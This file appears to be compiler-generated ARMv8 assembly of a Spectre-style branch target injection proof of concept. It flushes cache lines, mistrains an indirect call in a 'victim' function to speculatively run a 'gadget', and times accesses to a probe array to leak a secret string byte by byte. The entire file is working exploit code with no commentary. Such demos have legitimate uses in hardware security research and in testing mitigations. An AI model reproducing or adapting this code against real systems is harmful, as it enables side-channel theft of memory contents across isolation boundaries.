	.arch armv8-a
	.file	"source.c"
	.global	counter
	.bss
	.align	3
	.type	counter, %object
	.size	counter, 8
counter:
	.zero	8
	.global	miss_min
	.align	3
	.type	miss_min, %object
	.size	miss_min, 8
miss_min:
	.zero	8
	.comm	unused1,64,8
	.global	array1
	.data
	.align	3
	.type	array1, %object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused2,64,8
	.comm	channel,131072,8
	.global	secret
	.section	.rodata
	.align	3
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw",@progbits
	.align	3
	.type	secret, %object
	.size	secret, 8
secret:
	.xword	.LC0
	.comm	target,8,8
	.text
	.align	2
	.global	inc_counter
	.type	inc_counter, %function
inc_counter:
	sub	sp, sp, #16
	str	x0, [sp, 8]
.L2:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	add	x1, x0, 1
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	str	x1, [x0]
#APP
// 31 "source.c" 1
	DMB SY
// 0 "" 2
#NO_APP
	b	.L2
	.size	inc_counter, .-inc_counter
	.align	2
	.type	timed_read, %function
timed_read:
	sub	sp, sp, #32
	str	x0, [sp, 8]
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x0, [x0]
	str	x0, [sp, 24]
	ldr	x0, [sp, 8]
#APP
// 43 "source.c" 1
	DSB SY
LDR X5, [x0]
DSB SY

// 0 "" 2
#NO_APP
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	ldr	x0, [sp, 24]
	sub	x0, x1, x0
	add	sp, sp, 32
	ret
	.size	timed_read, .-timed_read
	.align	2
	.type	flush, %function
flush:
	sub	sp, sp, #16
	str	x0, [sp, 8]
	ldr	x0, [sp, 8]
#APP
// 56 "source.c" 1
	DC CIVAC, x0
// 0 "" 2
// 59 "source.c" 1
	DSB SY
// 0 "" 2
#NO_APP
	nop
	add	sp, sp, 16
	ret
	.size	flush, .-flush
	.align	2
	.global	measure_latency
	.type	measure_latency, %function
measure_latency:
	stp	x29, x30, [sp, -48]!
	add	x29, sp, 0
	mov	x0, 1048575
	str	x0, [x29, 32]
	str	wzr, [x29, 28]
	b	.L7
.L9:
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	flush
	adrp	x0, :got:array1
	ldr	x0, [x0, #:got_lo12:array1]
	bl	timed_read
	str	x0, [x29, 40]
	ldr	x1, [x29, 40]
	ldr	x0, [x29, 32]
	cmp	x1, x0
	bcs	.L8
	ldr	x0, [x29, 40]
	str	x0, [x29, 32]
.L8:
	ldr	w0, [x29, 28]
	add	w0, w0, 1
	str	w0, [x29, 28]
.L7:
	ldr	w0, [x29, 28]
	cmp	w0, 299
	ble	.L9
	ldr	x0, [x29, 32]
	ldp	x29, x30, [sp], 48
	ret
	.size	measure_latency, .-measure_latency
	.align	2
	.global	gadget
	.type	gadget, %function
gadget:
	sub	sp, sp, #16
	str	x0, [sp, 8]
	ldr	x0, [sp, 8]
	ldrb	w0, [x0]
	lsl	w2, w0, 9
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	sxtw	x0, w2
	ldrb	w0, [x1, x0]
	add	sp, sp, 16
	ret
	.size	gadget, .-gadget
	.align	2
	.global	safe_target
	.type	safe_target, %function
safe_target:
	mov	w0, 42
	ret
	.size	safe_target, .-safe_target
	.align	2
	.global	victim
	.type	victim, %function
victim:
	sub	sp, sp, #32
	str	x0, [sp, 8]
	str	w1, [sp, 4]
	str	wzr, [sp, 24]
#APP
// 97 "source.c" 1
	mov x19, x30

// 0 "" 2
#NO_APP
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	ldr	x0, [x0]
#APP
// 99 "source.c" 1
	mov x3, x0
// 0 "" 2
#NO_APP
	ldr	x0, [sp, 8]
#APP
// 101 "source.c" 1
	mov x0, x0

// 0 "" 2
// 112 "source.c" 1
	blr x3

// 0 "" 2
// 115 "source.c" 1
	mov x0, x0
// 0 "" 2
#NO_APP
	str	w0, [sp, 28]
#APP
// 118 "source.c" 1
	mov x30, x19

// 0 "" 2
#NO_APP
	ldr	w1, [sp, 28]
	ldr	w0, [sp, 24]
	and	w0, w1, w0
	add	sp, sp, 32
	ret
	.size	victim, .-victim
	.align	2
	.global	readByte
	.type	readByte, %function
readByte:
	sub	sp, sp, #1104
	stp	x29, x30, [sp, -32]!
	add	x29, sp, 0
	str	x19, [sp, 16]
	str	x0, [x29, 56]
	str	x1, [x29, 48]
	str	x2, [x29, 40]
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 1128]
	mov	x1,0
	mov	w0, 36
	strb	w0, [x29, 79]
	str	wzr, [x29, 88]
	b	.L18
.L19:
	ldrsw	x0, [x29, 88]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	str	wzr, [x0, 3064]
	ldr	w0, [x29, 88]
	add	w0, w0, 1
	str	w0, [x29, 88]
.L18:
	ldr	w0, [x29, 88]
	cmp	w0, 255
	ble	.L19
	mov	w0, 999
	str	w0, [x29, 84]
	b	.L20
.L39:
	str	wzr, [x29, 88]
	b	.L21
.L22:
	ldr	w0, [x29, 88]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	flush
	ldr	w0, [x29, 88]
	add	w0, w0, 1
	str	w0, [x29, 88]
.L21:
	ldr	w0, [x29, 88]
	cmp	w0, 255
	ble	.L22
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	adrp	x1, :got:gadget
	ldr	x1, [x1, #:got_lo12:gadget]
	str	x1, [x0]
	mov	w0, 50
	str	w0, [x29, 92]
	b	.L23
.L24:
	add	x0, x29, 79
	mov	w1, 0
	bl	victim
	ldr	w0, [x29, 92]
	sub	w0, w0, #1
	str	w0, [x29, 92]
.L23:
	ldr	w0, [x29, 92]
	cmp	w0, 0
	bgt	.L24
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	adrp	x1, :got:safe_target
	ldr	x1, [x1, #:got_lo12:safe_target]
	str	x1, [x0]
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	ldr	x0, [x0]
	bl	flush
	str	wzr, [x29, 80]
	b	.L25
.L26:
	ldr	w0, [x29, 80]
	add	w0, w0, 1
	str	w0, [x29, 80]
.L25:
	ldr	w0, [x29, 80]
	cmp	w0, 99
	ble	.L26
	mov	w1, 0
	ldr	x0, [x29, 56]
	bl	victim
	str	wzr, [x29, 88]
	b	.L27
.L29:
	ldr	w1, [x29, 88]
	mov	w0, 167
	mul	w0, w1, w0
	add	w0, w0, 13
	and	w0, w0, 255
	str	w0, [x29, 100]
	ldr	w0, [x29, 100]
	lsl	w0, w0, 9
	sxtw	x1, w0
	adrp	x0, :got:channel
	ldr	x0, [x0, #:got_lo12:channel]
	add	x0, x1, x0
	bl	timed_read
	mov	x19, x0
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	cmp	x19, x0
	bhi	.L28
	ldrb	w0, [x29, 79]
	mov	w1, w0
	ldr	w0, [x29, 100]
	cmp	w1, w0
	beq	.L28
	ldr	w0, [x29, 100]
	cmp	w0, 0
	beq	.L28
	ldrsw	x0, [x29, 100]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	add	w0, w0, 1
	ldrsw	x1, [x29, 100]
	lsl	x1, x1, 2
	add	x2, x29, 1136
	add	x1, x2, x1
	sub	x1, x1, #4096
	str	w0, [x1, 3064]
.L28:
	ldr	w0, [x29, 88]
	add	w0, w0, 1
	str	w0, [x29, 88]
.L27:
	ldr	w0, [x29, 88]
	cmp	w0, 255
	ble	.L29
	mov	w0, -1
	str	w0, [x29, 96]
	ldr	w0, [x29, 96]
	str	w0, [x29, 92]
	str	wzr, [x29, 88]
	b	.L30
.L35:
	ldr	w0, [x29, 92]
	cmp	w0, 0
	blt	.L31
	ldrsw	x0, [x29, 88]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 92]
	lsl	x0, x0, 2
	add	x2, x29, 1136
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w1, w0
	blt	.L32
.L31:
	ldr	w0, [x29, 92]
	str	w0, [x29, 96]
	ldr	w0, [x29, 88]
	str	w0, [x29, 92]
	b	.L33
.L32:
	ldr	w0, [x29, 96]
	cmp	w0, 0
	blt	.L34
	ldrsw	x0, [x29, 88]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 96]
	lsl	x0, x0, 2
	add	x2, x29, 1136
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w1, w0
	blt	.L33
.L34:
	ldr	w0, [x29, 88]
	str	w0, [x29, 96]
.L33:
	ldr	w0, [x29, 88]
	add	w0, w0, 1
	str	w0, [x29, 88]
.L30:
	ldr	w0, [x29, 88]
	cmp	w0, 255
	ble	.L35
	ldr	w0, [x29, 92]
	cmp	w0, 0
	beq	.L41
	ldrsw	x0, [x29, 92]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldrsw	x0, [x29, 96]
	lsl	x0, x0, 2
	add	x2, x29, 1136
	add	x0, x2, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	lsl	w0, w0, 1
	add	w0, w0, 5
	cmp	w1, w0
	bge	.L38
	ldrsw	x0, [x29, 92]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w0, 2
	bne	.L37
	ldrsw	x0, [x29, 96]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w0, [x0, 3064]
	cmp	w0, 0
	beq	.L38
	b	.L37
.L41:
	nop
.L37:
	ldr	w0, [x29, 84]
	sub	w0, w0, #1
	str	w0, [x29, 84]
.L20:
	ldr	w0, [x29, 84]
	cmp	w0, 0
	bgt	.L39
.L38:
	ldr	w0, [x29, 92]
	uxtb	w1, w0
	ldr	x0, [x29, 48]
	strb	w1, [x0]
	ldrsw	x0, [x29, 92]
	lsl	x0, x0, 2
	add	x1, x29, 1136
	add	x0, x1, x0
	sub	x0, x0, #4096
	ldr	w1, [x0, 3064]
	ldr	x0, [x29, 40]
	str	w1, [x0]
	ldr	x0, [x29, 48]
	add	x0, x0, 1
	ldr	w1, [x29, 96]
	uxtb	w1, w1
	strb	w1, [x0]
	ldr	x0, [x29, 40]
	add	x0, x0, 4
	ldrsw	x1, [x29, 96]
	lsl	x1, x1, 2
	add	x2, x29, 1136
	add	x1, x2, x1
	sub	x1, x1, #4096
	ldr	w1, [x1, 3064]
	str	w1, [x0]
	nop
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x29, 1128]
	ldr	x0, [x0]
	eor	x0, x1, x0
	cmp	x0, 0
	beq	.L40
	bl	__stack_chk_fail
.L40:
	ldr	x19, [sp, 16]
	ldp	x29, x30, [sp], 32
	add	sp, sp, 1104
	ret
	.size	readByte, .-readByte
	.section	.rodata
	.align	3
.LC1:
	.string	"Putting '%s' in memory\n"
	.align	3
.LC2:
	.string	"Error creating thread\n"
	.align	3
.LC3:
	.string	"miss_min %d\n"
	.align	3
.LC4:
	.string	"Reading %d bytes starting at %p:\n"
	.align	3
.LC5:
	.string	"reading %p...\n"
	.align	3
.LC6:
	.string	"Success"
	.align	3
.LC7:
	.string	"Unclear"
	.align	3
.LC8:
	.string	"%s: "
	.align	3
.LC9:
	.string	"0x%02X='%c' score=%d "
	.align	3
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.text
	.align	2
	.global	main
	.type	main, %function
main:
	stp	x29, x30, [sp, -96]!
	add	x29, sp, 0
	str	w0, [x29, 28]
	str	x1, [x29, 16]
	adrp	x0, :got:__stack_chk_guard
	ldr	x0, [x0, #:got_lo12:__stack_chk_guard]
	ldr	x1, [x0]
	str	x1, [x29, 88]
	mov	x1,0
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x1, [x0]
	adrp	x0, .LC1
	add	x0, x0, :lo12:.LC1
	bl	printf
	str	xzr, [x29, 56]
	b	.L43
.L44:
	adrp	x0, :got:channel
	ldr	x1, [x0, #:got_lo12:channel]
	ldr	x0, [x29, 56]
	add	x0, x1, x0
	mov	w1, 1
	strb	w1, [x0]
	ldr	x0, [x29, 56]
	add	x0, x0, 1
	str	x0, [x29, 56]
.L43:
	ldr	x1, [x29, 56]
	mov	x0, 131071
	cmp	x1, x0
	bls	.L44
	adrp	x0, :got:inc_counter
	ldr	x1, [x0, #:got_lo12:inc_counter]
	add	x0, x29, 48
	mov	x3, 0
	mov	x2, x1
	mov	x1, 0
	bl	pthread_create
	cmp	w0, 0
	beq	.L59
	adrp	x0, :got:stderr
	ldr	x0, [x0, #:got_lo12:stderr]
	ldr	x1, [x0]
	adrp	x0, .LC2
	add	x0, x0, :lo12:.LC2
	mov	x3, x1
	mov	x2, 22
	mov	x1, 1
	bl	fwrite
	mov	w0, 1
	b	.L57
.L59:
	nop
.L47:
	adrp	x0, :got:counter
	ldr	x0, [x0, #:got_lo12:counter]
	ldr	x1, [x0]
	mov	x0, 38527
	movk	x0, 0x98, lsl 16
	cmp	x1, x0
	bls	.L47
#APP
// 271 "source.c" 1
	DSB SY
// 0 "" 2
#NO_APP
	bl	measure_latency
	mov	x1, x0
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	sub	x1, x0, #1
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	str	x1, [x0]
	adrp	x0, :got:miss_min
	ldr	x0, [x0, #:got_lo12:miss_min]
	ldr	x0, [x0]
	mov	w1, w0
	adrp	x0, .LC3
	add	x0, x0, :lo12:.LC3
	bl	printf
	mov	x0, 8
	bl	malloc
	mov	x1, x0
	adrp	x0, :got:target
	ldr	x0, [x0, #:got_lo12:target]
	str	x1, [x0]
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x0, [x0]
	bl	strlen
	str	w0, [x29, 44]
	adrp	x0, :got:secret
	ldr	x0, [x0, #:got_lo12:secret]
	ldr	x0, [x0]
	str	x0, [x29, 64]
	adrp	x0, .LC4
	add	x0, x0, :lo12:.LC4
	ldr	x2, [x29, 64]
	ldr	w1, [x29, 44]
	bl	printf
	b	.L48
.L56:
	adrp	x0, .LC5
	add	x0, x0, :lo12:.LC5
	ldr	x1, [x29, 64]
	bl	printf
	ldr	x0, [x29, 64]
	add	x1, x0, 1
	str	x1, [x29, 64]
	add	x2, x29, 72
	add	x1, x29, 80
	bl	readByte
	ldr	w1, [x29, 72]
	ldr	w0, [x29, 76]
	lsl	w0, w0, 1
	cmp	w1, w0
	blt	.L49
	adrp	x0, .LC6
	add	x0, x0, :lo12:.LC6
	b	.L50
.L49:
	adrp	x0, .LC7
	add	x0, x0, :lo12:.LC7
.L50:
	adrp	x1, .LC8
	add	x2, x1, :lo12:.LC8
	mov	x1, x0
	mov	x0, x2
	bl	printf
	ldrb	w0, [x29, 80]
	mov	w4, w0
	ldrb	w0, [x29, 80]
	cmp	w0, 31
	bls	.L51
	ldrb	w0, [x29, 80]
	cmp	w0, 126
	bhi	.L51
	ldrb	w0, [x29, 80]
	mov	w1, w0
	b	.L52
.L51:
	mov	w1, 63
.L52:
	ldr	w2, [x29, 72]
	adrp	x0, .LC9
	add	x0, x0, :lo12:.LC9
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
	ldr	w0, [x29, 76]
	cmp	w0, 0
	ble	.L53
	ldrb	w0, [x29, 81]
	mov	w4, w0
	ldrb	w0, [x29, 81]
	cmp	w0, 31
	bls	.L54
	ldrb	w0, [x29, 81]
	cmp	w0, 126
	bhi	.L54
	ldrb	w0, [x29, 81]
	mov	w1, w0
	b	.L55
.L54:
	mov	w1, 63
.L55:
	ldr	w2, [x29, 76]
	adrp	x0, .LC10
	add	x0, x0, :lo12:.LC10
	mov	w3, w2
	mov	w2, w1
	mov	w1, w4
	bl	printf
.L53:
	mov	w0, 10
	bl	putchar
.L48:
	ldr	w0, [x29, 44]
	sub	w0, w0, #1
	str	w0, [x29, 44]
	ldr	w0, [x29, 44]
	cmp	w0, 0
	bge	.L56
	mov	w0, 10
	bl	putchar
	mov	w0, 0
.L57:
	adrp	x1, :got:__stack_chk_guard
	ldr	x1, [x1, #:got_lo12:__stack_chk_guard]
	ldr	x2, [x29, 88]
	ldr	x1, [x1]
	eor	x1, x2, x1
	cmp	x1, 0
	beq	.L58
	bl	__stack_chk_fail
.L58:
	ldp	x29, x30, [sp], 96
	ret
	.size	main, .-main
	.ident	"GCC: (Ubuntu/Linaro 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
